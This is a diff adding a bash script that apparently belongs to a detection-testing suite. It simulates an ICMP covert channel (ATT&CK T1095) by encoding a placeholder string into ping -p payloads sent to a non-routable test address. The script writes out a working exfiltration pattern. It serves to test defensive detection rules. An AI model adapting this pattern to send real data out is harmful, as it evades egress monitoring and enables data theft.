@@ -1,0 +1,15 @@
+#!/bin/bash
+
+echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92m[T1095] ICMP covert channel: data bytes are smuggled inside ICMP echo (ping) payloads via the -p pattern flag, a non-application-layer channel that evades HTTP/DNS egress monitoring.\033[m"
+# SIMULATION ONLY: encodes a harmless placeholder and sends the bytes as ping -p payload
+# patterns to a NON-ROUTABLE TEST-NET address (RFC 5737). The detection rule requires a
+# non-loopback destination (it explicitly excludes 127.0.0.1/localhost/::1), so this must
+# NOT target loopback. No data actually reaches anything; the ping -p pattern is the signal.
+DATA="SIMULATION-ONLY"
+HEX=$(printf '%s' "$DATA" | hexdump -v -e '1/1 "%.2x "')
+n=0
+for byte in $HEX; do
+  ping -c1 -W1 -p "$byte" 198.51.100.1 >/dev/null 2>&1
+  n=$((n+1))
+done
+echo "  (sent $n data bytes via ICMP -p payload to a non-routable test address)"
